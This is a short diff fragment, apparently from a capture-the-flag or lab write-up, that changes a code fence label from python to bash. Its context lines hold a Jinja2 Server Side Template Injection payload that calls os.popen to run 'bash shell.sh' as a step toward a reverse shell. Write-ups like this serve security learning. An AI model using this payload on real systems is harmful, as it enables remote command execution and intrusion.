@@ -78,7 +78,7 @@ It’s vulnerable to Server Side Template Injection.
 
 Let’s now try to get a reverse shell.
 
-```python
+```bash
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash shell.sh').read() }}
 
 OR
